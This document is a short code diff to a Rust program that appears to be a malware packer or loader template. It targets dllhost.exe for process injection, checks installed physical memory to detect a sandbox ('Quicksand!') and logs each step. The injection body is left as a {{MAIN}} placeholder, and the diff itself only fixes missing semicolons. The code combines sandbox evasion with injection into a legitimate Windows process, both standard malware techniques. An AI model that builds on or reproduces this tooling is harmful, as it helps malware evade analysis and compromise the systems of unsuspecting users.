@@ -95,16 +95,16 @@ fn main() {
     let tar: &str = "dllhost.exe";
     let file_path = "packer-log.txt";
 
-    append_to_file(file_path, b"Injecting into dllhost.exe")
+    append_to_file(file_path, b"Injecting into dllhost.exe");
 
     let mut memory = 0;
     unsafe {
         let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
         println!("{:#?}", is_quicksand);
         if is_quicksand != 1 {
-            append_to_file(file_path, b"Quicksand!")
+            append_to_file(file_path, b"Quicksand!");
         } else {
-            append_to_file(file_path, b"Not in quicksand")
+            append_to_file(file_path, b"Not in quicksand");
         }
     }
 
@@ -115,8 +115,8 @@ fn main() {
     }
     let list: Vec<usize> = boxboxbox(tar);
     if list.len() == 0 {
-        append_to_file(file_path, b"Unable to find process dllhost.exe")
-        println!("[-] Unable to find a process.")
+        append_to_file(file_path, b"Unable to find process dllhost.exe");
+        println!("[-] Unable to find a process.");
     } else {
         for i in &list {
             {{MAIN}}
